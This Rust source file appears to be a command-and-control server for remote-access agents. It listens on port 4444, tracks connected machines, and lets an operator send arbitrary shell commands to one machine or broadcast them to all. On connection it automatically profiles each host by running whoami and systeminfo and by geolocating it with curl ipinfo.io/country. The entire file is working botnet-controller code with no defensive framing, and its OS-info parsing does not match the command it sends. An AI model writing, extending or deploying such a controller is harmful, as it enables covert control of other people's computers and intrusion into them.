use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use tokio::process::Command;
use tokio::time::{sleep, Duration};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicU64, Ordering};
use std::io::{self, BufRead};

type ClientId = u64;

// Estructura para manejar cada cliente
struct ClientHandle {
    addr: String,
    tx: mpsc::Sender<String>,
    username: Option<String>,
    os_info: Option<String>,
    country: Option<String>,
}

// Variable global para selección de cliente
static SELECTED_CLIENT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

// Maneja la comunicación con un cliente
async fn handle_client(mut socket: tokio::net::tcp::OwnedReadHalf, id: ClientId, clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>) {
    let mut buf = vec![0u8; 4096]; // Buffer más grande para respuestas

    loop {
        match socket.read(&mut buf).await {
            Ok(0) => {
                println!("🔌 Cliente [{}] desconectado", id);
                clients.lock().unwrap().remove(&id);
                return;
            }
            Ok(n) => {
                let data = &buf[..n];
                let response = String::from_utf8_lossy(data).trim().to_string();
                
                // Mostrar la respuesta del agente
                println!("📨 [{}] Respuesta:", id);
                println!("{}", response);
                println!(); // Línea en blanco para separar
                
                // Actualizar información del cliente si es necesario
                update_client_info(id, &response, &clients).await;
            }
            Err(e) => {
                eprintln!("⚠️ Error en cliente {}: {:?}", id, e);
                clients.lock().unwrap().remove(&id);
                return;
            }
        }
    }
}

// Función para actualizar información del cliente basada en las respuestas
async fn update_client_info(id: ClientId, response: &str, clients: &Arc<Mutex<HashMap<ClientId, ClientHandle>>>) {
    let mut map = clients.lock().unwrap();
    if let Some(client) = map.get_mut(&id) {
        // Detectar respuesta de whoami
        if response.contains("\\") && client.username.is_none() {
            client.username = Some(response.split('\\').last().unwrap_or("Desconocido").to_string());
        }
        
        // Detectar respuesta de información del OS
        if response.contains("ProductName") && client.os_info.is_none() {
            // Extraer nombre del producto de Windows
            if let Some(product_line) = response.lines().find(|line| line.contains("ProductName")) {
                if let Some(product_name) = product_line.split(':').nth(1) {
                    client.os_info = Some(product_name.trim().to_string());
                }
            }
        }
        
        // Detectar respuesta del país
        if response.len() == 2 && response.chars().all(|c| c.is_alphabetic()) && client.country.is_none() {
            client.country = Some(response.to_uppercase());
        }
    }
}

fn handle_command(cmd: &str, clients: &Arc<Mutex<HashMap<ClientId, ClientHandle>>>) {
    let parts: Vec<&str> = cmd.trim().split_whitespace().collect();
    if parts.is_empty() {
        return;
    }

    match parts[0] {
        "/list" => {
            let map = clients.lock().unwrap();
            println!("📋 Clientes conectados:");
            if map.is_empty() {
                println!("  No hay clientes conectados");
            } else {
                // Header de la tabla
                println!("{:<5} {:<18} {:<15} {:<25} {:<10}", "ID", "Dirección", "Usuario", "Sistema Operativo", "País");
                println!("{}", "-".repeat(73));
                
                for (id, h) in map.iter() {
                    println!("{:<5} {:<18} {:<15} {:<25} {:<10}", 
                        id,
                        h.addr,
                        h.username.as_deref().unwrap_or("Desconocido"),
                        h.os_info.as_deref().unwrap_or("Desconocido"),
                        h.country.as_deref().unwrap_or("Desconocido")
                    );
                }
            }
        }
        "/cmd" => {
            if parts.len() < 2 {
                println!("❌ Uso: /cmd <comando>");
                return;
            }
            let command = parts[1..].join(" ");
            let selected_id = SELECTED_CLIENT.load(Ordering::Relaxed);
            
            if selected_id == 0 {
                println!("❌ No hay cliente seleccionado. Use /select <id> primero");
                return;
            }
            
            let map = clients.lock().unwrap();
            if let Some(client_handle) = map.get(&selected_id) {
                if let Err(e) = client_handle.tx.try_send(command.clone()) {
                    eprintln!("⚠️ Error enviando a {}: {:?}", selected_id, e);
                } else {
                    println!("📤 Comando enviado a [{}]: {}", selected_id, command);
                }
            } else {
                println!("❌ Cliente seleccionado {} ya no está conectado", selected_id);
                SELECTED_CLIENT.store(0, Ordering::Relaxed);
            }
        }
        "/cmd_all" => {
            if parts.len() < 2 {
                println!("❌ Uso: /cmd_all <comando>");
                return;
            }
            let command = parts[1..].join(" ");
            let map = clients.lock().unwrap();
            if map.is_empty() {
                println!("❌ No hay clientes conectados");
                return;
            }
            for (id, h) in map.iter() {
                if let Err(e) = h.tx.try_send(command.clone()) {
                    eprintln!("⚠️ Error enviando a {}: {:?}", id, e);
                } else {
                    println!("📤 Comando enviado a [{}]: {}", id, command);
                }
            }
        }
        "/select" => {
            if parts.len() < 2 {
                println!("❌ Uso: /select <id>");
                return;
            }
            let id: ClientId = match parts[1].parse() {
                Ok(v) => v,
                Err(_) => { 
                    println!("❌ ID inválido"); 
                    return; 
                }
            };
            let map = clients.lock().unwrap();
            if map.contains_key(&id) {
                SELECTED_CLIENT.store(id, Ordering::Relaxed);
                println!("✅ Cliente [{}] seleccionado", id);
                println!("ℹ️ Ahora puedes usar /cmd <comando> para enviar comandos a este cliente");
            } else {
                println!("❌ Cliente {} no existe", id);
            }
        }
        "/cmd_selected" => {
            println!("ℹ️ Use /cmd <comando> después de seleccionar un cliente con /select <id>");
        }
        "/help" => {
            println!("📖 Comandos disponibles:");
            println!("  /list                    -> lista clientes conectados");
            println!("  /select <id>             -> selecciona un cliente por ID");
            println!("  /cmd <comando>           -> envía comando al cliente seleccionado");
            println!("  /cmd_all <comando>       -> envía comando a todos los clientes");
            println!("  /help                    -> muestra esta ayuda");
        }
        _ => println!("❓ Comando desconocido: {}. Use /help para ver comandos disponibles.", parts[0]),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("0.0.0.0:4444").await?;
    println!("🚀 Server escuchando en 0.0.0.0:4444");

    let clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>> = Arc::new(Mutex::new(HashMap::new()));
    let id_gen = AtomicU64::new(0);

    // Tarea para leer comandos desde la CLI
    {
        let clients_cli = Arc::clone(&clients);
        std::thread::spawn(move || {
            let stdin = io::stdin();
            for line in stdin.lock().lines() {
                if let Ok(cmd) = line {
                    handle_command(&cmd, &clients_cli);
                }
            }
        });
    }

    // Aceptar clientes
    loop {
        let (socket, addr) = listener.accept().await?;
        let id = id_gen.fetch_add(1, Ordering::Relaxed) + 1;

        // Canal para enviar mensajes al cliente
        let (tx, mut rx) = mpsc::channel::<String>(32);

        println!("🔗 Nuevo cliente [{}] desde {}", id, addr);

        // Crear handle temporal sin información adicional
        let client_handle = ClientHandle {
            addr: addr.to_string(),
            tx: tx.clone(),
            username: None,
            os_info: None,
            country: None,
        };
        
        clients.lock().unwrap().insert(id, client_handle);

        // Solicitar información del cliente
        let info_tx = tx.clone();
        tokio::spawn(async move {
            // Esperar un momento para que el cliente se establezca
            sleep(Duration::from_millis(1000)).await;
            
            // Solicitar username
            if let Err(e) = info_tx.send("whoami".to_string()).await {
                eprintln!("⚠️ Error solicitando username a {}: {:?}", id, e);
                return;
            }
            
            sleep(Duration::from_millis(2000)).await;
            
            // Solicitar información del OS
            if let Err(e) = info_tx.send("systeminfo | findstr /C:\"OS Name\"".to_string()).await {
                eprintln!("⚠️ Error solicitando OS info a {}: {:?}", id, e);
                return;
            }
            
            sleep(Duration::from_millis(2000)).await;
            
            // Solicitar IP pública para determinar país
            if let Err(e) = info_tx.send("curl -s ipinfo.io/country".to_string()).await {
                eprintln!("⚠️ Error solicitando país a {}: {:?}", id, e);
            }
        });

        // Split the socket into reader and writer halves
        let (reader, mut writer) = socket.into_split();

        // Tarea: escritor (consume rx y escribe al socket)
        tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                if let Err(e) = writer.write_all(msg.as_bytes()).await {
                    eprintln!("⚠️ Error escribiendo a {}: {:?}", id, e);
                    break;
                }
            }
        });

        // Tarea: lector (procesa las respuestas del cliente)
        let clients_reader = Arc::clone(&clients);
        tokio::spawn(handle_client(reader, id, clients_reader));
    }
}
